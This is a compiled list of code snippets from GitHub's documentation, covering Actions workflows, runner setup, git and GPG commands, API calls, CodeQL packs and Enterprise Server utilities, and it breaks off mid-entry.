This snippet shows how to mask a string using the `add-mask` workflow command in PowerShell.  This command prevents the specified string from being displayed in the workflow logs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_16\n\nLANGUAGE: powershell\nCODE:\n```\nWrite-Output \"::add-mask::Mona The Octocat\"\n```\n\n----------------------------------------\n\nTITLE: Proxy Configuration in .env File\nDESCRIPTION: This code snippet demonstrates how to configure proxy settings within a `.env` file for a self-hosted runner. It defines `https_proxy` for HTTPS traffic and `no_proxy` to bypass the proxy for specific hosts.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/using-a-proxy-server-with-self-hosted-runners.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nhttps_proxy=http://proxy.local:8080\nno_proxy=example.com,myserver.local:443\n```\n\n----------------------------------------\n\nTITLE: Job Level Concurrency Configuration YAML\nDESCRIPTION: This YAML snippet shows how to specify concurrency at the job level within a GitHub Actions workflow. This allows other jobs to proceed even if the concurrent job is pending. It sets the 'production' environment and specifies concurrency for the 'deployment' job only.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-with-github-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: Deployment\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: production\n    concurrency: production\n    steps:\n      - name: deploy\n        # ...deployment-specific steps\n```\n\n----------------------------------------\n\nTITLE: Configuring Runner Job (Container Jobs) - YAML\nDESCRIPTION: This YAML snippet demonstrates the configuration of a runner job within a GitHub Actions workflow, specifically when using service containers. It sets the `runs-on` to `ubuntu-latest`, indicating a Linux-based environment for container execution. The `container` directive specifies the Docker Hub image (`node:20-bookworm-slim`) that the `container-job` will execute in. Additionally, it defines a `postgres` service container with its image, password, and health check options.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-postgresql-service-containers.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:20-bookworm-slim\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n```\n\n----------------------------------------\n\nTITLE: Generating GPG Key (older versions)\nDESCRIPTION: Generates a GPG key pair for older GPG versions (prior to 2.1.17) using the `gpg --default-new-key-algo rsa4096 --gen-key` command. This command sets the default key algorithm to RSA4096.  Requires a working GPG installation.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/generating-a-new-gpg-key.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngpg --default-new-key-algo rsa4096 --gen-key\n```\n\n----------------------------------------\n\nTITLE: Interactive Git Shell (ghe-repo)\nDESCRIPTION: This command changes to a repository's directory and opens an interactive shell as the `git` user.  This allows for manual inspection and maintenance of the repository. Requires the USERNAME/REPONAME as input.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_62\n\nLANGUAGE: shell\nCODE:\n```\nghe-repo USERNAME/REPONAME\n```\n\n----------------------------------------\n\nTITLE: Removing Forbidden Words from Labels in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: `label` contains forbidden word\" error. It is triggered when a `label` attribute contains a word from a list of forbidden terms (e.g., \"Password\"). The corrected example replaces the forbidden word with an acceptable alternative.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: Hello world!\n- type: input\n  attributes:\n    label: Password\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: Hello world!\n- type: input\n  attributes:\n    label: Username\n```\n\n----------------------------------------\n\nTITLE: Defining a Core CodeQL Query Pack in YAML\nDESCRIPTION: This YAML snippet defines the `qlpack.yml` file for a core CodeQL query pack for C/C++.  It specifies the pack's name, version, dependencies on `codeql/cpp-all` and `codeql/suite-helpers`, the directory containing query suites, and the default query suite file. Dependencies are resolved from source, so version compatibility is less crucial.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\nname: codeql/cpp-queries\nversion: x.y.z-dev\ndependencies:\n    codeql/cpp-all: \"*\"\n    codeql/suite-helpers: \"*\"\nsuites: codeql-suites\ndefaultSuiteFile: codeql-suites/cpp-code-scanning.qls\n```\n\n----------------------------------------\n\nTITLE: Pushing Commits: Git Push\nDESCRIPTION: This command pushes the rewritten, smaller commit to the remote repository on GitHub. This step finalizes the removal of the large file from the repository's history on the remote.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/about-large-files-on-github.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git push\n# Push our rewritten, smaller commit\n```\n\n----------------------------------------\n\nTITLE: GitLab CI/CD Runner Syntax\nDESCRIPTION: This YAML snippet demonstrates how to specify runners in GitLab CI/CD using tags. It defines two jobs, `windows_job` and `linux_job`, each with a specific tag that determines the platform on which the job will run. The scripts contain echo commands tailored to each platform.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nwindows_job:\n  tags:\n    - windows\n  script:\n    - echo Hello, %USERNAME%!\n\nlinux_job:\n  tags:\n    - linux\n  script:\n    - echo \"Hello, $USER!\"\n```\n\n----------------------------------------\n\nTITLE: Building a Docker image (GHES)\nDESCRIPTION: This command builds a Docker image from a Dockerfile, tagging it with a name and version for publishing to the GitHub Packages registry on a GitHub Enterprise Server (GHES) instance. It requires the OWNER, REPOSITORY, IMAGE_NAME, VERSION, HOSTNAME and PATH to be specified.  It includes variations for subdomain isolation enabled and disabled.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ndocker build -t docker.HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:VERSION PATH\n```\n\nLANGUAGE: Shell\nCODE:\n```\ndocker build -t HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:VERSION PATH\n```\n\n----------------------------------------\n\nTITLE: Cloning a GitHub Repository using Git\nDESCRIPTION: This snippet demonstrates how to clone a remote GitHub repository to your local machine using the `git clone` command.  It requires the URL of the remote repository. The cloned repository includes all files, history, and branches. Replace `owner/repo` with the actual owner and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git.md#_snippet_0\n\nLANGUAGE: Bash\nCODE:\n```\ngit clone https://github.com/owner/repo.git\n```\n\n----------------------------------------\n\nTITLE: Querying next page of pull requests using cursor in GraphQL\nDESCRIPTION: This GraphQL query retrieves the next page of pull requests for a given repository, using a cursor obtained from a previous response. It specifies the `owner` and `name` of the repository, the number of pull requests to retrieve (`first: 1`), and the cursor to start from (`after`). The query returns the `createdAt`, `number`, and `title` of each pull request, along with `endCursor`, `hasNextPage`, and `hasPreviousPage` information for pagination.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-pagination-in-the-graphql-api.md#_snippet_1\n\nLANGUAGE: graphql\nCODE:\n```\nquery($owner: String!, $name: String!) {\n  repository(owner: $owner, name: $name) {\n    pullRequests(first: 1, after: \"Y3Vyc29yOnYyOpHOUH8B7g==\") {\n      nodes {\n        createdAt\n        number\n        title\n      }\n      pageInfo {\n        endCursor\n        hasNextPage\n        hasPreviousPage\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Copilot Metrics API using Octokit.js\nDESCRIPTION: This JavaScript snippet uses the Octokit.js library to query the GitHub Copilot metrics API for an organization. It retrieves Copilot usage data and logs the response to the console.  It requires the `manage_billing:copilot` scope.  Ensure to replace placeholders for the token and organization name.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/analyzing-usage-over-time-with-the-copilot-metrics-api.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Import Octokit\nimport { Octokit } from \"octokit\";\n\n// Set your token and organization\nconst octokit = new Octokit({\n  auth: 'YOUR_TOKEN'\n});\nconst org = 'YOUR_ORG';\n\n// Set other variables if required for the endpoint you're using\n/*\nconst team = 'YOUR_TEAM';\nconst enterprise = 'YOUR_ENTERPRISE';\nconst entTeam = 'YOUR_ENTERPRISE_TEAM';\n*/\n\n// Call the API\nasync function orgMetrics() {\n  const resp = await octokit.request(`GET /orgs/${org}/copilot/metrics`, {\n    org: 'ORG',\n    headers: {\n      'X-GitHub-Api-Version': '2022-11-28'\n    }\n  });\n\n  const copilotUsage = resp.data;\n\n  console.log(copilotUsage);\n  }\n\n// Call the function\norgMetrics();\n```\n\n----------------------------------------\n\nTITLE: Setting Workflow Permissions (read-all)\nDESCRIPTION: This YAML snippet configures permissions for the `GITHUB_TOKEN` at the workflow level. It sets `permissions: read-all`, granting read access to all available scopes for all jobs in the workflow. This allows jobs to access various resources with read-only privileges.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/setting-permissions-all-jobs-example.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"My workflow\"\n\non: [ push ]\n\npermissions: read-all\n\njobs:\n  ...\n```\n\n----------------------------------------\n\nTITLE: Downloading Service Account Key with gcloud\nDESCRIPTION: This command downloads the JSON keyfile for a service account using `gcloud iam service-accounts keys create`. The keyfile is saved as `key.json`, and the service account's email address is specified using `$SA_EMAIL`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngcloud iam service-accounts keys create key.json --iam-account=$SA_EMAIL\n```\n\n----------------------------------------\n\nTITLE: Adding Files to Git Repository\nDESCRIPTION: This snippet adds all files in the current directory to the staging area. The `git add .` command stages the files, preparing them for the next commit.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/adding-locally-hosted-code-to-github.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git add .\n# Adds the files in the local repository and stages them for commit. {% data reusables.git.unstage-codeblock %}\n```\n\n----------------------------------------\n\nTITLE: Checking for SSH config file - Shell\nDESCRIPTION: This command attempts to open the SSH config file located at `~/.ssh/config` using the `open` command on macOS.  It is used to determine if the file exists. The expected output indicates whether the file exists or not.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ open ~/.ssh/config\n```\n\n----------------------------------------\n\nTITLE: Creating MinIO Bucket (Local Deployment Shell)\nDESCRIPTION: This snippet configures the MinIO client to connect to a local MinIO instance and attempts to create a bucket. Replace `BUCKET-NAME` with the desired name for the bucket. It sets the `MC_HOST_minio` environment variable to the MinIO server's address and credentials. This example is designed for a standalone MinIO deployment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nexport MC_HOST_minio=\"http://${MINIO_ACCESS_KEY}:${MINIO_SECRET_KEY} @localhost:9000\"\ndocker run minio/mc BUCKET-NAME\n```\n\n----------------------------------------\n\nTITLE: Updating a Custom Text Field using GraphQL with gh\nDESCRIPTION: This snippet demonstrates updating a custom text, number, or date field for a project item using the GitHub CLI (`gh`) and GraphQL. It requires replacing `PROJECT_ID`, `ITEM_ID`, and `FIELD_ID` with the appropriate values. The `gh` CLI handles authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_22\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  mutation {\\n    updateProjectV2ItemFieldValue(\\n      input: {\\n        projectId: \"PROJECT_ID\"\\n        itemId: \"ITEM_ID\"\\n        fieldId: \"FIELD_ID\"\\n        value: {\\n          text: \"Updated text\"\\n        }\\n      }\\n    ) {\\n      projectV2Item {\\n        id\\n      }\\n    }\\n  }'\n```\n\n----------------------------------------\n\nTITLE: Workflow Configuration for Action Usage\nDESCRIPTION: Defines a workflow that uses the composite action. It specifies the job to run on `ubuntu-latest`, checks out the repository, and then uses the composite action with the input `who-to-greet` set to 'Mona the Octocat'.  It then echoes the random number that is an output of the composite action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\non: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - id: foo\n        uses: OWNER/hello-world-composite-action@SHA\n        with:\n          who-to-greet: 'Mona the Octocat'\n      - run: echo random-number \"$RANDOM_NUMBER\"\n        shell: bash\n        env:\n          RANDOM_NUMBER: {% raw %}${{ steps.foo.outputs.random-number }}{% endraw %}\n\n```\n\n----------------------------------------\n\nTITLE: Setting Password with ghe-set-password (Shell)\nDESCRIPTION: The `ghe-set-password` utility sets a new root site administrator password for authentication to the Management Console. This is used for managing access to the web UI.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_20\n\nLANGUAGE: shell\nCODE:\n```\nghe-set-password\n```\n\n----------------------------------------\n\nTITLE: Security Context Update for Runner Pod - YAML\nDESCRIPTION: This YAML snippet shows how to update the `securityContext` of a runner pod to resolve permission issues with persistent volumes. It sets the `fsGroup` to match the GID of the runner.  Replace `VERSION` with the appropriate version of the `actions-runner` container image and `123` with the correct group ID.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nspec:\n    securityContext:\n        fsGroup: 123\n    containers:\n    - name: runner\n    image: ghcr.io/actions/actions-runner:latest\n    command: [\"/home/runner/run.sh\"]\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow on Repository Dispatch Event (YAML)\nDESCRIPTION: This workflow configuration triggers when a `repository_dispatch` event is received with the `event_type` set to `test_result`. The `repository_dispatch` event is triggered externally via the GitHub API.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_43\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  repository_dispatch:\n    types: [test_result]\n```\n\n----------------------------------------\n\nTITLE: Defining Environment Variables in GitHub Actions\nDESCRIPTION: This YAML snippet defines environment variables within a GitHub Actions workflow step. It sets the `GH_TOKEN` environment variable using a secret named `YOUR_TOKEN`. The value of the secret is retrieved and assigned to the `GH_TOKEN` variable. The {% raw %}${{ secrets.YOUR_TOKEN }}{% endraw %} syntax is used to access the secret.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/automating-projects-using-actions.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Set fields\n  env:\n    GH_TOKEN: {% raw %}${{ secrets.YOUR_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Making API request with GitHub CLI\nDESCRIPTION: This example shows how to use the GitHub CLI to make a GET request to the /octocat endpoint to retrieve the Octocat as ASCII art. It includes setting the Accept and X-GitHub-Api-Version headers.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh api --method GET /octocat \\\n--header 'Accept: application/vnd.github+json' \\\n--header \"X-GitHub-Api-Version: 2022-11-28\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Job Failure Handling in Workflow\nDESCRIPTION: This YAML snippet demonstrates how to configure job failure handling in a GitHub Actions workflow using `continue-on-error` and `fail-fast`. `continue-on-error` is dynamically set based on the `matrix.experimental` value. If any job with `continue-on-error: false` fails, all in-progress or queued jobs will be cancelled due to `fail-fast: true`. If a job with `continue-on-error: true` fails, other jobs will not be affected.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-a-build-matrix-for-your-jobs-failfast.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  test:\n    runs-on: ubuntu-latest\n    continue-on-error: {% raw %}${{ matrix.experimental }}{% endraw %}\n    strategy:\n      fail-fast: true\n      matrix:\n        version: [6, 7, 8]\n        experimental: [false]\n        include:\n          - version: 9\n            experimental: true\n```\n\n----------------------------------------\n\nTITLE: Generating Completions using Copilot's LLM - JavaScript\nDESCRIPTION: This code snippet demonstrates how to use GitHub Copilot's LLM to generate completions for user messages by making a POST request to the `/chat/completions` endpoint. It includes the necessary headers for authorization and content type, and it stringifies the request body, which contains the messages and stream flag. The `tokenForUser` variable should contain the authentication token.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/using-copilots-llm-for-your-agent.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n  // Use Copilot's LLM to generate a response to the user's\n  //  messages, with our extra system messages attached.\n  const copilotLLMResponse = await fetch(\n    \"https://api.githubcopilot.com/chat/completions\",\n    {\n      method: \"POST\",\n      headers: {\n        authorization: `Bearer ${tokenForUser}`,\n        \"content-type\": \"application/json\",\n      },\n      body: JSON.stringify({\n        messages,\n        stream: true,\n      }),\n    }\n  );\n```\n\n----------------------------------------\n\nTITLE: Moving Assigned Cards on Project Boards with GitHub Actions (YAML)\nDESCRIPTION: This workflow automatically moves an issue to a specified column on a {% data variables.projects.projects_v1_board %} when the issue is assigned. It utilizes the `alex-page/github-project-automation-plus` action. The workflow is triggered by the `issues` event with the `assigned` type. It requires a personal access token with the `repo` scope stored as a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/project-management/moving-assigned-issues-on-project-boards.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Move assigned card\non:\n  issues:\n    types:\n      - assigned\njobs:\n  move-assigned-card:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: alex-page/github-project-automation-plus@7ffb872c64bd809d23563a130a0a97d01dfa8f43\n        with:\n          project: Docs Work\n          column: In Progress\n          repo-token: {% raw %}${{ secrets.PERSONAL_ACCESS_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Annotating YAML Workflow\nDESCRIPTION: This YAML code demonstrates a GitHub Actions workflow that posts a welcome comment on a newly opened pull request. Annotations are used to explain each section of the workflow, including the name, trigger events, permissions, jobs, and steps. The `annotate` modifier enables the annotations, and comments are used to provide explanations for each line or block of code.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/annotating-code-examples.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# The name of the workflow as it will appear in the \"Actions\" tab of the GitHub repository.\nname: Post welcome comment\n# The `on` keyword lets you define the events that trigger when the workflow is run.\non:\n  # Add the `pull_request` event, so that the workflow runs automatically\n  # every time a pull request is created.\n  pull_request:\n    types: [opened]\n# Modifies the default permissions granted to `GITHUB_TOKEN`.\npermissions:\n  pull-requests: write\n# Defines a job with the ID `build` that is stored within the `jobs` key.\njobs:\n  build:\n    name: Post welcome comment\n    # Configures the operating system the job runs on.\n    runs-on: ubuntu-latest\n    # The `run` keyword tells the job to execute a command on the runner.\n    steps:\n      - run: gh pr comment $PR_URL --body \"Welcome to the repository!\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          PR_URL: ${{ github.event.pull_request.html_url }}\n```\n\n----------------------------------------\n\nTITLE: Versioning content with YAML frontmatter\nDESCRIPTION: This YAML snippet demonstrates how to version content for specific products and versions using the `versions` property in the frontmatter of a Markdown file. It shows examples for Free, Pro, & Team plans, and all versions of GitHub Enterprise Server.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  PRODUCT: 'VERSIONS'\n  PRODUCT: 'VERSIONS'\n  ...\n```\n\n----------------------------------------\n\nTITLE: Staging and Committing Changes Using Git\nDESCRIPTION: This snippet demonstrates how to stage all changes and commit them with a message using Git. This prepares the changes to be pushed to the remote repository. Requires Git to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/exploring-projects-on-github/contributing-to-a-project.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit add .\ngit commit -m \"a short description of the change\"\n```\n\n----------------------------------------\n\nTITLE: Mapping Redis Ports for a Service Container in GitHub Actions\nDESCRIPTION: This YAML snippet shows how to map a service container's port to the Docker host when running the job directly on the runner machine. It defines a service container `redis` and maps port 6379 of the container to port 6379 on the host.  This allows the job to access the Redis service running in the container via `localhost:6379` or `127.0.0.1:6379`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/about-service-containers.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Redis Service Example\non: push\n\njobs:\n  # Label of the container job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        #\n        ports:\n          # Opens tcp port 6379 on the host and service container\n          - 6379:6379\n```\n\n----------------------------------------\n\nTITLE: Checking runner activity with PowerShell event logs\nDESCRIPTION: This command uses PowerShell's `Get-EventLog` cmdlet to check the recent activity of the self-hosted runner in the Windows Application event log. It filters events by the `ActionsRunnerService` source. Useful for monitoring job executions and service status.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_11\n\nLANGUAGE: powershell\nCODE:\n```\nPS C:\\actions-runner> Get-EventLog -LogName Application -Source ActionsRunnerService\n```\n\n----------------------------------------\n\nTITLE: Setting all Permissions for a Repository (JSON)\nDESCRIPTION: This JSON snippet illustrates how to set all permissions (read or write) for a given repository in the `devcontainer.json` file. It uses the `permissions` property with the value `write-all` to grant all write permissions to the specified repository (my_org/my_repo) when creating a codespace. Any custom permissions added or changed will only apply to new codespaces created after the changes have been committed.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/managing-your-codespaces/managing-repository-access-for-your-codespaces.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"customizations\": {\n    \"codespaces\": {\n      \"repositories\": {\n        \"my_org/my_repo\": {\n          \"permissions\": \"write-all\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Signing a Git Commit using GPG\nDESCRIPTION: This snippet demonstrates how to sign a Git commit using the `-S` flag. It creates a signed commit with the provided commit message. The user will be prompted for their GPG key passphrase after executing this command.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/signing-commits.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ git commit -S -m \"YOUR_COMMIT_MESSAGE\"\n# Creates a signed commit\n```\n\n----------------------------------------\n\nTITLE: Pulling Latest Changes from Remote Main Branch\nDESCRIPTION: This command retrieves the most recent commits from the remote `main` branch and merges them into the local `main` branch. This is essential to keep the local branch up-to-date and minimize potential merge conflicts.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngit pull origin main\n```\n\n----------------------------------------\n\nTITLE: Setting execute permissions for scripts (Windows)\nDESCRIPTION: This command sets execute permissions for a shell script file using git on Windows. This is required to make the script executable within the Git environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit update-index --chmod=+x SCRIPT_FILE.sh\n```\n\n----------------------------------------\n\nTITLE: Authenticating as a GitHub App Installation (Ruby)\nDESCRIPTION: This helper method `authenticate_installation` authenticates as a specific installation of the GitHub App. It retrieves the installation ID from the payload, requests an access token for that installation from the GitHub API, and creates a new Octokit client with the installation token. This allows the app to perform actions on behalf of the installed user/organization.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n    # Instantiate an Octokit client, authenticated as an installation of a\n    # GitHub App, to run API operations.\n    def authenticate_installation(payload)\n      @installation_id = payload['installation']['id']\n      @installation_token = @app_client.create_app_installation_access_token(@installation_id)[:token]\n      @installation_client = Octokit::Client.new(bearer_token: @installation_token)\n    end\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Importer\nDESCRIPTION: This shell script demonstrates the interactive configuration of the GitHub Actions Importer CLI. It prompts the user for necessary credentials, including a GitHub personal access token, a Bitbucket workspace access token, and the base URLs for both GitHub and Bitbucket instances. The script assumes the `gh actions-importer` command is available in the user's PATH.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer configure\n```\n\n----------------------------------------\n\nTITLE: Example `strategy` Context - JSON\nDESCRIPTION: This JSON snippet shows the contents of the `strategy` context from a matrix job. It shows `fail-fast`, `job-index`, `job-total`, and `max-parallel` properties. The example represents the last job in a matrix of four.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_16\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"fail-fast\": true,\n  \"job-index\": 3,\n  \"job-total\": 4,\n  \"max-parallel\": 4\n}\n```\n\n----------------------------------------\n\nTITLE: Publishing to Maven Central and GitHub Packages Workflow YAML\nDESCRIPTION: This workflow publishes a Java package to both the Maven Central Repository and GitHub Packages on release. It uses the `setup-java` action to configure Maven for each repository and uses secrets for authentication. The workflow checks out the code, sets up Java twice (once for Maven Central, once for GitHub Packages), and then deploys to each.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-maven.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nname: Publish package to the Maven Central Repository and GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Java for publishing to Maven Central Repository\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n          server-id: ossrh\n          server-username: MAVEN_USERNAME\n          server-password: MAVEN_PASSWORD\n      - name: Publish to the Maven Central Repository\n        run: mvn --batch-mode deploy\n        env:\n          MAVEN_USERNAME: {% raw %}${{ secrets.OSSRH_USERNAME }}{% endraw %}\n          MAVEN_PASSWORD: {% raw %}${{ secrets.OSSRH_TOKEN }}{% endraw %}\n      - name: Set up Java for publishing to GitHub Packages\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Publish to GitHub Packages\n        run: mvn --batch-mode deploy\n        env:\n          GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Setting Push Location for Mirror\nDESCRIPTION: Sets the push location to the mirrored repository, simplifying the process of pushing updates to the mirror.  Sets the remote URL for the 'origin' remote to the URL of the mirrored repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/duplicating-a-repository.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ncd REPOSITORY-TO-MIRROR\ngit remote set-url --push origin https://{% data variables.product.product_url %}/EXAMPLE-USER/MIRRORED\n```\n\n----------------------------------------\n\nTITLE: Adding CodeQL Pack Dependency - Shell\nDESCRIPTION: This command adds a dependency to a CodeQL pack by specifying the scope, name, and optionally, a compatible version range.  It updates the `qlpack.yml` file and downloads the dependency into the package cache. Note that the file will be reformatted and all comments will be removed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-and-working-with-codeql-packs.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql pack add <scope>/<name>@x.x.x <scope>/<other-name>\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependabot 